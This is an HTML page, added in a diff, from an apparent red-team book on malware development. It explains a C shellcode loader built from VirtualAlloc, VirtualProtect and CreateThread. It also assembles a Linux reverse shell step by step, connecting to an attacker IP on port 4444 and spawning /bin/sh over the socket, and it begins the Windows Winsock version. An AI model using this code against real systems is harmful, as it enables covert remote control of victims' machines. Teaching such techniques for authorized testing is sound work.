@@ -1,0 +1,2042 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Malware Essentials - Windows Offensive Techniques for Authorized Red Teams</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="favicon.svg">
+        <link rel="shortcut icon" href="favicon.png">
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+        <link rel="stylesheet" href="css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" id="highlight-css" href="highlight.css">
+        <link rel="stylesheet" id="tomorrow-night-css" href="tomorrow-night.css">
+        <link rel="stylesheet" id="ayu-highlight-css" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+        <link rel="stylesheet" href="src/mdbook-admonish.css">
+        <link rel="stylesheet" href="src/custom.css">
+        <link rel="stylesheet" href="./mdbook-admonish.css">
+
+
+        <!-- Provide site root and default themes to javascript -->
+        <script>
+            const path_to_root = "";
+            const default_light_theme = "light";
+            const default_dark_theme = "navy";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                let theme = localStorage.getItem('mdbook-theme');
+                let sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
+            let theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            let sidebar = null;
+            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Windows Offensive Techniques for Authorized Red Teams</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="malware-essentials"><a class="header" href="#malware-essentials">Malware Essentials</a></h1>
+<p><code>Malware</code> is a type of software designed to conduct malicious actions, such as gaining unauthorized access to a computer or stealing sensitive information from a computer. Malware can be used by ethical hackers to execute an authorized security assessment of an organization. Developing custom tools, such as malware, that have not been analyzed or signed by security vendors provides the attack team with an advantage in terms of detection.</p>
+<div id="admonition-note" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-title">
+<div class="admonition-title">
+<div id="admonition-note-title">
+<p>Note</p>
+</div>
+<a class="admonition-anchor-link" href="#admonition-note"></a>
+</div>
+<div>
+<p>The methods used by an attack team to avoid detection is sometimes referred to as <strong>Operational Security</strong> (OpSec).
+<code>OpSec</code>: a military term used to describe the set of practices and mindset used to protect information about operations so that adversaries can't discover, understand, or exploit them.</p>
+<p>Within the context of Offensive Security, <code>OpSec</code> is about protecting both the technical and human traces that would reveal the activity, identity, tools, or intentions of the Red Team, while staying within legal and ethical boundaries.</p>
+</div>
+</div>
+<p>Malware can be developed in any programming language, but C/C++ have long been a preferred language for both malware development and the broader field of adversary simulation. These languages allow for direct manipulation of hardware and memory, offering unparalleled control and flexibility in crafting code that interacts with operating systems, network protocols, and other core computing components.</p>
+<h2 id="a-simple-example"><a class="header" href="#a-simple-example">A Simple Example</a></h2>
+<p>First, a basic piece of malware may allocate a chunk of memory:</p>
+<pre><code class="language-C">payload_mem = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
+</code></pre>
+<p>Where:</p>
+<ul>
+<li><code>VirtualAlloc</code>: a core Windows API (part of Win32, <code>kernel32.dll</code>), which allows a process to reserve, commit, or change the state of pages in its virtual address space. It is fundamental for many memory related operations, including many in Malware Development, such as:
+<ul>
+<li>Allocating a buffer for shellcode</li>
+<li>Process Injection</li>
+<li>Manipulating memory pages</li>
+</ul>
+</li>
+</ul>
+<p>Here is a breakdown of the <code>VirtualAlloc</code> functions parameters:</p>
+<pre><code class="language-C">LPVOID VirtualAlloc(
+    LPVOID lpAddress,
+    SIZE_T dwSize,
+    DWORD flAllocationType,
+    DWORD flProtect
+);
+</code></pre>
+<ul>
+<li><code>lpAddress</code>: A pointer to the desired starting address of the region to allocate. <code>0</code> or <code>NULL</code> defaults to a random location determined by the system.</li>
+<li><code>dwSize</code>: Specifies the size of the region to allocate in bytes. <code>VirtualAlloc</code> allocates memory in terms of whole pages. The provided will be rounded up to the next page boundary.</li>
+<li><code>flAllocationType</code>: A bitmask that defines the type of memory allocation. Flags can be combined using the <strong>bitwise OR</strong> (|) operator:
+<ul>
+<li><code>MEM_COMMIT</code>: Commits a reserved page, allocating physical space in RAM</li>
+<li><code>MEM_RESERVE</code>: Reserves a range of the process's virtual address space, preventing other allocations from using this range.</li>
+<li><code>MEM_RESET</code>: Removes a specified set of pages from the working set to allow the system to reclaim the physical RAM used by those pages without having to write their contents to the page file. This is undone by <code>MEM_RESET_UNDO</code> (if possible).</li>
+</ul>
+</li>
+<li><code>flProtect</code>: A bitmask that specifies the memory protection for the allocated region. This dictates what operations (<strong>Read</strong>, <strong>Write</strong>, or <strong>Execute</strong>) are allowed:
+<ul>
+<li><code>PAGE_EXECUTE_READ</code>: Grants Read and Execute (RX) permissions.</li>
+<li><code>PAGE_EXECUTE_READWRITE</code>: Grants Read, Write, and Execute (RWX) permissions.</li>
+<li><code>PAGE_EXECUTE_WRITECOPY</code>: Similar to RWX, but for copy-on-write scenarios.</li>
+<li><code>PAGE_NOACCESS</code>: Grants no permissions on the memory region for the current process.</li>
+<li><code>PAGE_READONLY</code>: Grants Read (R) permissions.</li>
+<li><code>PAGE_READWRITE</code>: Grants Read and Write (RW) permissions.</li>
+</ul>
+</li>
+</ul>
+<p><code>VirtualAlloc</code> returns the base address of the allocated region on success, and returns <code>NULL</code> on failure. If an error occurs, use the <code>GetLastError()</code> API to learn more about why.</p>
+<p>After allocating the memory space, the payload gets copied into that memory region:</p>
+<pre><code class="language-C">RtlMoveMemory(payload_mem, actual_payload, sizeof(payload));
+</code></pre>
+<p>Where:</p>
+<ul>
+<li><code>RtlMoveMemory</code>: a core Windows API (part of Win32 API, <code>kernel32.dll</code>), used to copy a block of memory from a source location to a destination within the same virtual address space. Fundamental for malware developers because it is a reliable way to manipulate and execute code directly in a computer's memory. Its ability to handle overlapping memory regions is crucial fro a wide variety of in-memory attacks that help malware evade detection by antivirus and security software, including:
+<ul>
+<li>Shellcode Execution</li>
+<li>Process Injection</li>
+<li>Process Hollowing</li>
+<li>In-Memory Patching and Hooking</li>
+</ul>
+</li>
+</ul>
+<p>Here is a breakdown of the <code>RtlMoveMemory</code> functions parameters:</p>
+<pre><code class="language-C">void RtlMoveMemory(
+    void* Destination,
+    const void* Source,
+    SIZE_T Length
+);
+</code></pre>
+<ul>
+<li><code>Destination</code>: A pointer to the starting address of the destination memory block.</li>
+<li><code>Source</code>: A constant pointer to the starting address of the source memory block.</li>
+<li><code>Length</code>: The number of bytes to copy from the source to the destination.</li>
+</ul>
+<p>After the payload is copied into the process's memory, the permissions for that memory region must be updated so that the payload can be executed:</p>
+<pre><code class="language-C">operation_status = VirtualProtect(payload_mem, sizeof(payload), PAGE_EXECUTE_READ, &amp;old_protect);
+</code></pre>
+<p>Where:</p>
+<ul>
+<li><code>VirtualProtect</code>: A core Windows API (part of the Win32 API, <code>kernel32.dll</code>), which updates the permissions of a given region of memory. It is used by malware to avoid detection by:
+<ul>
+<li>Evading Signature-Based Detection</li>
+<li>Bypassing Behavioral Analysis</li>
+<li>Executing Code Directly in Memory</li>
+</ul>
+</li>
+</ul>
+<p>Here is a breakdown of the <code>VirtualProtect</code> functions parameters:</p>
+<pre><code class="language-C">BOOL VirtualProtect(
+    LPVOID lpAddress,
+    SIZE_T dwSize,
+    DWORD flNewProtect,
+    PDWORD lpflOldProtect
+);
+</code></pre>
+<ul>
+<li><code>lpAddress</code>: A pointer to the starting address of the memory region whose protection attributes are to be changed.</li>
+<li><code>dwSize</code>: The size of the memory region in bytes for which the protection attributes are to be changed.</li>
+<li><code>flNewProtect</code>: A flag specifying the new protection options for the memory region.</li>
+<li><code>lpflOldProtect</code>: A pointer to a variable that receives the previous protection options of the specified memory region.</li>
+</ul>
+<p><code>VirtualProtect</code> returns a non-zero value if successful and zero if the operation failed.</p>
+<p>Finally, since the memory region is executable, the malware creates a new thread of execution and starts running the payload in that new thread:</p>
+<pre><code class="language-C">if (operation_status != 0){
+    thread_handle = CreateThread(0, 0, (LP_THREAD_START_ROUTINE)payload_mem, 0, 0, 0);
+    WaitForSingleObject(thread_handle, -1);
+}
+return 0;
+</code></pre>
+<p>Where:</p>
+<ul>
+<li><code>CreateThread</code>: A core Windows API (part of the Win32 API, <code>kernel32.dll</code>) used to create a new thread of execution within the address space of the calling process. Used by malware to concurrently run the payload with the rest of the application, often within the context of a legitimate process to avoid detection.
+Here is a breakdown of the <code>CreateThread</code> functions parameters:</li>
+</ul>
+<pre><code class="language-C">HANDLE CreateThread(
+    LPSECURITY_ATTRIBUTES lpThreadAttributes,
+    SIZE_T dwStackSize,
+    LPTHREAD_START_ROUTINE lpStartAddress,
+    LPVOID lpParameter,
+    DWORD dwCreationFlags,
+    LPDWORD lpThreadId
+);
+</code></pre>
+<ul>
+<li><code>lpThreadAttributes</code>: A pointer to a <code>SECURITY_ATTRIBUTES</code> structure that determines if the returned object handle can be inherited by child processes. If set to 'NULL', a default security descriptor is passed, which makes the thread uninheritable by child processes.</li>
+<li><code>dwStackSize</code>: The initial size of the new thread's stack in bytes, A vale of <code>0</code> defaults to the same size as the main threads stack.</li>
+<li><code>lpStartAddress</code>: A pointer to the application-defined function that the new thread will execute (the payload).</li>
+<li><code>lpParameter</code>: A pointer to a variable that is passed as a single argument to the function.</li>
+<li><code>dwCreationFlags</code>: A flag that controls the creation state of the new thread. It can be <code>0</code> to run the thread immediately or <code>CREATE_SUSPENDED</code> to create it in a suspended state.</li>
+<li><code>lpThreadId</code>: A pointer to a variable that receives the unique identifier for the new thread. This can be useful for managing or terminating the thread later.</li>
+</ul>
+<p><code>CreateThread</code> returns a handle to the new thread if successful. <code>NULL</code> if it fails.</p>
+<ul>
+<li><code>WaitForSingleObject</code>: A core Windows API (part of the Win32, <code>kernel32.dll</code>) used to wait for a single object to be in a signaled state (i.e., the thread completes execution).</li>
+</ul>
+<p>Here is a breakdown of the <code>WaitForSingleObject</code> function's parameters:</p>
+<pre><code class="language-C">DWORD WaitForSingleObject(
+    HANDLE hHandle,
+    DWORD dwMilliseconds
+);
+</code></pre>
+<ul>
+<li><code>hHandle</code>: A handle to the object you want to wait for</li>
+<li><code>dwMilliseconds</code>: The time-out interval in milliseconds.
+<ul>
+<li><code>INFINITE</code>: Functions will wait until the object is signaled. (Same as <code>-1</code>)</li>
+<li><code>0</code>: Function will check the objects state and return immediately without waiting.</li>
+</ul>
+</li>
+</ul>
+<p><code>WaitForSingleObject</code> returns a DWORD (32-bit unsigned integer) that indicates the state of the wait:</p>
+<ul>
+<li><code>WAIT_OBJECT_0</code>: Success</li>
+<li><code>WAIT_TIMEOUT</code>: Timeout elapsed before signal received</li>
+<li><code>WAIT_ABANDONED</code>: Specific to mutex objects. Thread holding mutex terminated without releasing.</li>
+<li><code>WAIT_FAILED</code>: Failure for any other reason.</li>
+</ul>
+<p>As we can see here, the granular control enabled by <code>C</code>/<code>C++</code> enables the creation of complex, stealthy, and tailored malware that can evade detection, manipulate system behavior, and carry out sophisticated tasks.</p>
+<h2 id="types-and-behaviors-of-malware"><a class="header" href="#types-and-behaviors-of-malware">Types and Behaviors of Malware</a></h2>
+<p>A <strong>Virus</strong> is a piece of code that attaches itself to other programs and replicates itself, often causing damage in the process. <strong>Worms</strong> are self-replicating malware that spreads autonomously across networks, without human intervention and <strong>Trojans</strong> are pieces of software that appear legitimate, but actually have a hidden, malicious purpose. As we move forward, we will discover how these, and other types of malware are implemented and used. There are many types of malware, but generally speaking, malware applications exhibit certain types of behavior that allow them to be classified as malicious programs. Some of these behaviors include:</p>
+<ul>
+<li><code>Backdoors</code>: A feature of malware that allows an attacker to break normal authentication or encryption, providing attackers with an invisible access to systems, enabling them to remotely control the victim's machine for various malicious activities.</li>
+<li><code>Downloaders</code>: Malicious programs, which download and install other malware once they are installed on a target system. These are often used in multi-stage attacks, where the downloader serves as a means to bring in more advanced, and sometimes tailored, threats onto the compromised machine.</li>
+<li><code>Remote Access Trojan</code>: A specific type of Trojan that provides an attacker with complete, covert, remote control over an infected machine. RATs can be particularly dangerous because they often remain undetected by antivirus software.</li>
+<li><code>Stealers</code>: Malware designed to extract sensitive data from a victim's system, including passwords, credit card details, and other personal information.</li>
+<li><code>Bootkits</code>: Malware that infects the <strong>master boot record</strong> (MBR). By attacking the startup routine, the bootkit ensures that it loads before the operating system, remaining hidden from antivirus programs.</li>
+</ul>
+<p>A particularly important behavior of malware is that it may establish a <strong>reverse shell</strong>. Reverse shells are a communication technique where the compromised machine initiates a connection to the attacker, creating a covert channel that can bypass firewalls and network restrictions. This technique, however, exposes the attacker's control server, and network security monitoring services may be able to detect traces.</p>
+<p>There are three stages required to create a reverse shell:</p>
+<ol>
+<li>An adversary exploits a system or network flaw that allows code execution on the target.</li>
+<li>The adversary the installs a listener on their own system.</li>
+<li>The vulnerability is exploited by the adversary injecting a reverse shell on a vulnerable system.</li>
+</ol>
+<p>In actual cyberattacks, the reverse shell can also be obtained through social engineering. For instance, malware installed on a local workstation through a phishing email or a malicious website could initiate an outgoing connection to a command server and provide the hacker with a reverse shell.</p>
+<h3 id="linux-reverse-shells"><a class="header" href="#linux-reverse-shells">Linux Reverse Shells</a></h3>
+<p>Fundamentally, computers are very complex machines. It would be practically infeasible to write a program that conducted every operation you, the developer, intended for it to do. For this reason, developers write and publish their own code, so that others can build their own applications using the pre-existing code. There is no need to re-invent the wheel.</p>
+<ol>
+<li>When building a reverse shell on linux, there are a number of headers that need to be included so that the program runs as intended:</li>
+</ol>
+<pre><code class="language-C">#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;netinet/ip.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;sys/socket.h&gt;
+</code></pre>
+<ul>
+<li><code>stdio.h</code>(Standard Input/Output): A standard C library header that provides functions for basic input and output operations. It's widely used in malware for tasks like printing debug messages to the console (<code>printf</code>) or reading and writing to files (<code>fopen</code>, <code>fread</code>, <code>fwrite</code>).</li>
+<li><code>unistd.h</code> (Unix Standard): Provides access to the <strong>Portable Operating System Interface</strong> (POSIX) API. It contains functions that give a program access to the operating system's features such as file II/O (read, write, close), process control (fork, exec), and system-level information. In malware development, it is used for low-level, direct interaction with the system, often for persistence or process manipulation.</li>
+<li><code>sys/socket.h</code>: The core header file for socket programming, which defines the data structures and functions required to create and manage network sockets. This is the foundation for any tool that needs to communicate over a network, including those that establish a reverse shell. Key functions include:
+<ul>
+<li><code>socket()</code>: Creates a new socket</li>
+<li><code>bind()</code>: Assigns a name (i.e., an IP address and port) to a socket.</li>
+<li><code>connect()</code>: Initiates a connection to a remote host.</li>
+<li><code>listen()</code>: Puts a socket in a listening state for incoming connections.</li>
+</ul>
+</li>
+<li><code>arpa/inet.h</code>: Provides functions for manipulating Interned Addresses. Used to convert between different data representations, such as converting a human-readable IP address string (i.e., <code>192.168.1.1</code>) into a binary format that can be used by the network functions defined in <code>sys/socket.h</code>.</li>
+<li><code>netinet/ip.h</code>: Defines the structures and constants for the <strong>Internet Protocol</strong> (IP). Used for more advanced, low-level network programming, such as when a program needs to directly craft and send custom IP packets, rather than using higher-level protocols like TCP or UDP. Particularly useful for certain types of exploits or covert communication.</li>
+</ul>
+<ol start="2">
+<li>After including the required headers, the first thing the malware does is define the IP address of the attacking machine:</li>
+</ol>
+<pre><code class="language-C">const char* attacker_ip = "10.10.1.5";
+</code></pre>
+<ol start="3">
+<li>Then, the malware prepares the target victim's address:</li>
+</ol>
+<pre><code class="language-C">struct sockaddr_in target_address;
+target_address.sin_family = AF_INET;
+target_address.sin_port = htons(4444);
+inet_aton(attacker_ip, &amp;target_address.sin_addr);
+</code></pre>
+<ul>
+<li>
+<p><code>sockaddr_in</code>: Used to specify the address and port of the communicating endpoint. It is passed to key socket functions to tell the operating system where to send or listen for data. It is included in <code>&lt;sys/socket.h&gt;</code>. Here are the <code>sockaddr_in</code> function's parameters:</p>
+<pre><code class="language-C">struct sockaddr_in {
+    sa_family_t sin_family;
+    in_port_t sin_port;
+    struct in_addr sin_addr;
+}
+</code></pre>
+<ul>
+<li><code>sin_family</code>: Specifies the address family of the new socket. Always <code>AF_INET</code> if the socket should be set up for IPv4.</li>
+<li><code>sin_port</code>: Holds the port number. Must be in network byte order (big-endian).</li>
+<li><code>sin_addr</code>: Another structure that contains the actual IPv4 address. Must be in network byte order (big-endian).</li>
+</ul>
+<p>A server/listener would fill a <code>sockadddr_in</code> structure with its own IP address and the port it wants to listen on. It then passes this structure to the <code>bind()</code> function to associate the socket with that specific address. A client would fill a <code>sockaddr_in</code> structure with the IP address and port of the server it wants to connect to . It then passes this structure to the <code>connect()</code> function.</p>
+</li>
+<li>
+<p><code>htons</code>: Used in network programming to convert a 16-bit integer from host byte order to network byte order. It stands for <strong>host to network, short</strong>. It is included in <code>&lt;arpa/inet.h&gt;</code>, but defined in <code>&lt;netinet/in.h&gt;</code> and its only argument is a 16-bit integer.</p>
+</li>
+<li>
+<p><code>inet_aton</code>: A standard C library function used for network programming, used to convert a human-readable IPv4 address string (in dotted-decimal notation) into a binary format that is compatible with network functions and stored in network byte order. It is included in <code>&lt;arpa/inet.h&gt;</code> and stands for <strong>Address to Network</strong> (Internet Address to Network Number).</p>
+<pre><code class="language-C">int inet_aton(const char *cp, struct in_addr *inp);
+</code></pre>
+<ul>
+<li><code>const char *cp</code>: The input parameter. A pointer to a character string that contains the IPv4 address you want to convert.</li>
+<li><code>struct in_addr *inp</code>: The output parameter. A pointer to an <code>in_addr</code> structure.</li>
+<li><code>inet_aton</code> returns a non-zero integer if successful. Zero upon failure.</li>
+</ul>
+</li>
+</ul>
+<ol start="4">
+<li>After creating the <code>sockaddr_in</code> object, the malware creates a new socket.</li>
+</ol>
+<pre><code class="language-C">int socket_file_descriptor = socket(AF_INET, SOCK_STREAM, 0);
+</code></pre>
+<p>Where:</p>
+<ul>
+<li><code>socket</code>: a fundamental system call used in <code>C/C++</code> to create a communication endpoint. Creating a socket is the first step a program takes when it wants to perform network communication, whether it is a client or a server. Include in <code>&lt;sys/socket.h&gt;</code>.
+<pre><code class="language-C">int socket(int domain, int type, int protocol);
+</code></pre>
+Here is a breakdown of its parameters:
+<ul>
+<li><code>int domain</code>: Specifies the communication domain or address family.
+<ul>
+<li><code>AF_INET</code>: Represents the IPv4 Internet Protocol</li>
+<li><code>AF_INET6</code>: Represents the IPv6 Internet Protocol</li>
+<li><code>AF_LOCAL</code> or <code>AF_UNIX</code>: Used for inter-process communication on a single machine.</li>
+</ul>
+</li>
+<li><code>int type</code>: Specifies the type of socket, which defines the communication semantics.
+<ul>
+<li><code>SOCK_STREAM</code>: Reliable, two-way connection (like TCP)</li>
+<li><code>SOCK_DGRAM</code>: Connectionless, unreliable datagram service (like UDP)</li>
+<li><code>SOCK_RAW</code>: Direct access to underlying network protocols. Used for advanced network tools or exploits.</li>
+</ul>
+</li>
+<li><code>int protocol</code>: Specifies the particular protocol to be used within the specified domain and type. Usually set to <code>0</code>, which tells the operating system to automatically choose the correct protocol. For instance, if you choose <code>AF_INET</code> and <code>SOCK_STREAM</code>, the protocol will automatically be <code>TCP</code>.</li>
+<li><code>socket</code> returns a non-negative integer on success. This integer is a socket descriptor (or a handle on Windows), which acts like a file descriptor. ALl subsequent network functions (<code>bind()</code>, <code>connect()</code>, <code>send()</code>, <code>recv()</code>) use this descriptor to identify the socket. On failure, it returns <code>-1</code>.</li>
+</ul>
+</li>
+</ul>
+<ol start="5">
+<li>Here, the new socket connects to the attacker's server:</li>
+</ol>
+<pre><code class="language-C">connect(socket_file_descriptor, (struct sockaddr*)&amp;target_address, sizeof(target_address));
+</code></pre>
+<p>Where:</p>
+<ul>
+<li><code>connect()</code>: A critical system call used by a client program to initiate a socket connection with a server. Attempts to establish a connection to a specific network address and port, which are typically defined by the server application that is already listening for incoming connections. Included in <code>&lt;sys/socket.h&gt;</code>.
+<pre><code class="language-C">int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
+</code></pre>
+Here is a breakdown of the function's parameters:
+<ul>
+<li><code>int sockfd</code>: Socket descriptor returned by <code>socket()</code></li>
+<li><code>const struct sockaddr *addr</code>: A pointer to a <code>sockaddr</code> structure</li>
+<li><code>socklen_t addrlen</code>: An integer that specifies the size, in bytes of the address structure pointed to by the <code>addr</code> parameter.</li>
+<li><code>connect()</code> returns <code>0</code> on success, <code>-1</code> on failure.</li>
+</ul>
+</li>
+</ul>
+<ol start="6">
+<li>The most important process occurs when standard input, standard output, and standard error are redirected to the socket:</li>
+</ol>
+<pre><code class="language-C">for (int index=0; index &lt; 3; index++){
+    dup2(socket_file_descriptor, index);
+}
+</code></pre>
+<p>Where:</p>
+<ul>
+<li><code>dup2()</code>: A powerful system call used in C programming on Unix-like systems to duplicate an existing file descriptor. Shorthand for <strong>duplicate to</strong>. Critical function for malware development because it is the primary way to redirect a program's standard input, output and error streams to a new destination, such as a network socket. It serves as the core mechanism used to create a reverse shell. Included in <code>&lt;unistd.h&gt;</code>.
+<pre><code class="language-C">int dup2(int oldfd, int newfd);
+</code></pre>
+Here is a breakdown of the function's parameters:
+<ul>
+<li><code>int oldfd</code>: The file descriptor that you want to duplicate. In the context of a reverse shell, this would be the socket descriptor returned by a <code>socket()</code> call.</li>
+<li><code>int newfd</code>: The new file descriptor number that you want the <code>oldfd</code> to be duplicated to. If <code>newfd</code> is already open, it is closed first. FOr a reverse shell, the values for this parameter are:
+<ul>
+<li><code>0</code>: Standard Input (<code>stdin</code>)</li>
+<li><code>1</code>: Standard Output (<code>stdout</code>)</li>
+<li><code>2</code>: Standard Error (<code>stderr</code>)</li>
+</ul>
+</li>
+<li><code>dup2</code> returns the new file descriptor on success (i.e., the same value as the <code>newfd</code> parameter). On failure, it returns <code>-1</code>.</li>
+</ul>
+</li>
+</ul>
+<ol start="7">
+<li>The last step is to spawn a shell:</li>
+</ol>
+<pre><code class="language-C">execve("/bin/sh", NULL, NULL);
+</code></pre>
+<p>Where:</p>
+<ul>
+<li><code>execve</code>: A powerful system call used on Unix-like operating systems to execute a new program by replacing the current process with a new one without creating a new process ID (PID). The new process completely overwrites the existing process code, data, and stack. From the perspective of the operating system, the process's PID remains the same, but the program it is running changes entirely. Included in <code>&lt;unistd.h&gt;</code>.
+<pre><code class="language-C">int execve(const char *pathname, char *const argv[], char *const envp[]);
+</code></pre>
+<ul>
+<li><code>const char *pathname</code>: A pointer to a null-terminated string that contains the full path to the executable file that you want to run.</li>
+<li><code>char *const argv[]</code>: A null-terminated array of pointers to character strings, which represent the command-line arguments for the new program. The first element of this array is conventionally the name of the program itself.
+<ul>
+<li>For instance, if you ran <code>ls -l</code>, <code>argv[] = {"ls", "-l", NULL}</code></li>
+</ul>
+</li>
+<li><code>char *const envp[]</code>: A null-terminated array of pointers to character strings representing the environment variables for the new program.</li>
+<li><code>execve</code> will not return is the call was successful, as the current program is replaced with the new one. If it fails, it returns <code>-1</code>.</li>
+</ul>
+</li>
+</ul>
+<h3 id="windows-reverse-shells"><a class="header" href="#windows-reverse-shells">Windows Reverse Shells</a></h3>
+<p>Conceptually, Windows Reverse Shells and Linux Reverse Shells utilize the same principles. In practice, Windows applications should be built using the Windows API because it exposes certain features of the operating system that the POSIX model cannot handle.</p>
+<ol>
+<li>Include the required libraries, variables and structures to create a reverse-shell:</li>
+</ol>
+<pre><code class="language-C">#include &lt;stdio.h&gt;
+#include &lt;winsock2.h&gt;
+#pragma comment(lib, "ws2_32")
+WSADATA socketData;
+SOCKET mainSocket;
+struct sockaddr_in connectionAddress;
+STARTUPINFO startupInfo;
+PROCESS_INFORMATION processInfo;
+</code></pre>
+<p>Where:</p>
+<ul>
+<li>
+<p><code>winsock2.h</code>: The primary header file for the Windows Sockets 2 API, often referred to as <strong>Winsock</strong>. It provides functionality similar to the <code>POSIX</code> sockets (<code>&lt;syn/socket.h&gt;</code>), with some critical differences:</p>
+<ul>
+<li><strong>Header Files</strong>: All necessary functions and data structures are typically contained within <code>winsock2.h</code> and <code>ws2_32.lib</code>, as opposed to the POSIX model, which has them distributed (<code>sys/socket.h</code>, <code>arpa/inet.h</code>, <code>netinet/in.h</code>).</li>
+<li><strong>API Initialization</strong>: Before you can make any winsock calls, you must initialize the library by calling the <code>WSAStartup()</code> function. This function takes a version number and a pointer to a <code>WSADATA</code> structure as parameters. When your program is finished using the API, you must call <code>WSACleanup()</code> to de-initialize the library.</li>
+<li><strong>Socket Handles</strong>: <code>WinSock</code> functions return a specific data type called <code>SOCKET</code> instead of a file descriptor.</li>
+<li><strong>Error Handling</strong>: INstead of checking the <code>errno</code> global variable, <code>Winsock</code> functions return a specific error code, and you retrieve detailed error information by calling <code>WSAGetLastError()</code>.</li>
+</ul>
+</li>
+<li>
+<p><code># pragma comment (lib, "ws2_32")</code>: A Microsoft-specific compiler directive used in <code>C/C++</code> programming to tell the linker where to find the code for functions in the <code>winsock2.h</code> header file.</p>
+</li>
+<li>
+<p><code>WSADATA</code>: A data structure that holds details about the Windows Sockets implementation on a given system. Its primary role is to be populated by the <code>WSAStartup</code> function. It is defined in <code>&lt;winsock2.h&gt;</code>.</p>
+<ul>
+<li><code>WSAStartup</code> fills the WSAData structure with important information about the Winsock DLL, confirming that the requested version of the API is available.</li>
